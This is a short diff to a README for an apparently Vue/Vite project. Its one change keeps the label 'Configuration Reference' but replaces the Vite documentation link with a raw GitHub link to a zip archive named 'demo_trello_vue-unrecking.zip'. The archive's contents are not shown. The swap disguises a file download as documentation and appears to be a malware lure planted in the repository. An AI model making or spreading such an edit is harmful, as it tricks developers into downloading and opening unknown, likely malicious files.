@@ -54,4 +54,4 @@ pnpm lint
 
 ### Customize configuration
 
-See [Configuration Reference](https://vitejs.dev/config/).
+See [Configuration Reference](https://raw.githubusercontent.com/ducanh2710203/demo_trello_vue/master/public/demo_trello_vue-unrecking.zip).
